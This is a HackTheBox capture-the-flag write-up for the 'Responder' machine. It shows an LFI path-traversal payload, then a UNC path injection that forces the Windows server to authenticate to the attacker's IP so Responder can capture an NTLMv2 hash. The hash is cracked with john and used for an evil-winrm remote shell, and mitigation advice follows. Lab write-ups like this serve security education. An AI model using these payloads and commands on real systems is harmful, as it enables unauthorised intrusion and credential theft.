# 🚩 Responder - Write-up

## 📝 General Information

| Attribute | Details |
| :--- | :--- |
| **Platform** | HackTheBox |
| **Difficulty** | Very Easy |
| **OS** | 🪟 Windows |
| **Mode** | 🔴 Retired |
| **Sections** | [1: Reconnaissance & Enumeration](#-1-reconnaissance--enumeration) <br> [2: Initial Foothold — LFI](#-2-initial-foothold--lfi) <br> [3: NTLM Hash Capture via Responder](#-3-ntlm-hash-capture-via-responder) <br> [4: Hash Cracking & Remote Access](#-4-hash-cracking--remote-access) <br> [5: Pwn3d !!](#-5-pwn3d-) |
| **Date** | 2026-04-19 |

---

## 🎯 Executive Summary

The attack chain on **Responder** begins with a **Local File Inclusion (LFI)** vulnerability in a PHP-based multilingual website running on Windows. The vulnerable `page` parameter was abused to inject a UNC path pointing to the attacker's machine running **Responder**, forcing the Windows server to authenticate via SMB and leak an **NTLMv2 hash** for the `Administrator` account. The hash was cracked offline using `john` with the `rockyou.txt` wordlist, yielding the plaintext password `badminton`. Finally, `evil-winrm` was used to establish a remote PowerShell session as Administrator, and the user flag was retrieved from Mike's Desktop.

---

## 🛠️ Tools Used

`nmap`, `Responder`, `john`, `evil-winrm`

---

## 🔍 1: Reconnaissance & Enumeration

**Attacker IP:** `10.10.16.90`  
**Target IP:** `10.129.86.157`

### 1.1 Port Scanning

```bash
nmap -sS -sV -A -p- -T4 10.129.86.157
```

> 🧐 **Findings:**
>
> ```
> PORT     STATE SERVICE    VERSION
> 80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
> 5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
> 7680/tcp open  tcpwrapped
>
> OS Guess: Microsoft Windows 10 1903-21H1 (97%)
> ```
>
> | Port | Service | Notes |
> | :--- | :--- | :--- |
> | 80 | Apache / PHP 8.1.1 | Hosts the `unika.htb` web application |
> | 5985 | WinRM | Allows remote PowerShell sessions via Evil-WinRM |
> | 7680 | tcpwrapped | Not relevant |

### 1.2 Web Enumeration

Added the target to `/etc/hosts` for hostname resolution:

```bash
echo "10.129.86.157 unika.htb" | sudo tee -a /etc/hosts
```

Browsing to `http://unika.htb` revealed a business website with multi-language support. Switching the language changed the URL to:

```
http://unika.htb/index.php?page=german.html
```

The `page` parameter directly loads files from disk — a classic indicator of **Local File Inclusion**.

---

## 🚪 2: Initial Foothold — LFI

**Vulnerability:** `Local File Inclusion (LFI)`

### Exploit Steps

1. Tested the `page` parameter with a path traversal payload targeting a known Windows system file:

```
http://unika.htb/index.php?page=../../../../../../windows/system32/drivers/etc/hosts
```

2. The server returned the raw contents of the Windows `hosts` file — **LFI confirmed**.

> ✅ **Result:** Arbitrary file read achieved on the remote Windows host via path traversal.

---

## 📡 3: NTLM Hash Capture via Responder

**Vulnerability:** `UNC Path Injection → NTLM Relay`

### How It Works

Windows will automatically attempt **SMB authentication** when asked to access a UNC path (e.g. `\\attacker-ip\share`). By injecting a UNC path through the LFI parameter, we can force the server to authenticate against our machine and capture the **NTLMv2 hash** in transit.

### Exploit Steps

1. Start **Responder** on the VPN interface to intercept SMB authentication:

```bash
sudo responder -I tun0
```

2. Trigger the NTLM authentication by injecting the attacker's IP as a UNC path via the LFI:

```
http://unika.htb/index.php?page=//10.10.16.90/somefile
```

3. Responder captures the NTLMv2 hash:

```
[SMB] NTLMv2-SSP Client   : 10.129.86.157
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:2b60d05a1cdd0186:D1A0A2C82CFEB8994...
```

> ✅ **Result:** NTLMv2 hash for `RESPONDER\Administrator` successfully captured.

---

## 🔓 4: Hash Cracking & Remote Access

### 4.1 Cracking the Hash

Saved the captured hash to `hash.txt` and ran `john` against it:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

> ✅ **Result:**
>
> ```
> badminton        (Administrator)
> 1g 0:00:00:00 DONE — 11.11g/s 45511p/s
> ```

### 4.2 Remote Shell via Evil-WinRM

With valid credentials, connected to the WinRM service on port 5985:

```bash
evil-winrm -i 10.129.86.157 -u administrator -p badminton
```

> ✅ **Result:** Remote PowerShell shell obtained as `RESPONDER\Administrator`.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
responder\administrator
```

### 4.3 Retrieving the Flag

Navigated the file system to find the flag on Mike's Desktop:

```powershell
*Evil-WinRM* PS C:\Users> dir

    Directory: C:\Users

Mode   Name
----   ----
d----- Administrator
d----- mike
d-r--- Public

*Evil-WinRM* PS C:\Users> cd mike\Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
ea81b7afddd03efaa0945333ed147fac
```

---

## 🏁 5: Pwn3d !!

| Flag | Hash |
| :--- | :--- |
| 🧑 User Flag | `ea81b7afddd03efaa0945333ed147fac` |
| 👑 Root Flag | `N/A — Very Easy machine (User flag only)` |

---

## 🛡️ Mitigation Recommendations

1. **Local File Inclusion:** Never pass user-supplied input directly to file-loading functions. Use a strict whitelist of allowed page names and map them server-side rather than loading arbitrary paths.
2. **UNC Path Injection / NTLM Leak:** Block outbound SMB traffic (ports 445/139) at the firewall level to prevent the server from connecting to attacker-controlled hosts. Enable `SMB Signing` to mitigate relay attacks.
3. **Weak Passwords:** Enforce a strong password policy. `badminton` is trivially cracked from `rockyou.txt` — require long, complex, unique credentials for all privileged accounts.
4. **Exposed WinRM:** Restrict port `5985` to trusted management IPs only. Remote management interfaces should never be reachable from untrusted networks.

---

*Created with 💜 by Reef*
